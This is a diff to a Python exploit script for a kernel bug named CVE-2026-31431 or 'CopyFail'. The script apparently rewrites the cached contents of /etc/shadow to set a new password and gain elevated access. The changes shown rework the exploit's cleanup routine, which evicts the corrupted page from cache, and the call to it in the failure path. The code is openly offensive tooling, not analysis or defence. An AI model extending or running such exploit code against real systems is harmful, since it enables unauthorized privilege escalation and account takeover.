@@ -218,15 +218,13 @@ def print_usage(shadow_summary: dict[str, tuple[bytes, int]]) -> None:
 
 
 # This is also largely from https://github.com/rootsecdev/cve_2026_31431
-def copfail_cleanup():
+def copfail_cleanup(fd: int):
     # evict the corrupted page so the rest of the system stops
     # seeing a broken UID->name mapping. Any user can request
     # POSIX_FADV_DONTNEED on a file they can read.
-    fd = os.open(PASSWD, os.O_RDONLY)
-    try:
-        os.posix_fadvise(fd, 0, 0, os.POSIX_FADV_DONTNEED)
-    finally:
-        os.close(fd)
+    os.posix_fadvise(fd, 0, 0, os.POSIX_FADV_DONTNEED)
+    # If CopyFail is broken we can't finish anyway
+    os.close(fd)
     print(f"Cleanup: /etc/shadow page cache evicted, original password restored.")
 
 
@@ -311,7 +309,7 @@ if __name__ == "__main__":
         except Exception as e:
             print(f"CVE-2026-31431 / CopyFail failure: {e}")
             print("Cleaning up page cache...")
-            copfail_cleanup()
+            copfail_cleanup(shadow_fd)
             sys.exit(1)
 
     print("Successfully wrote new password!")
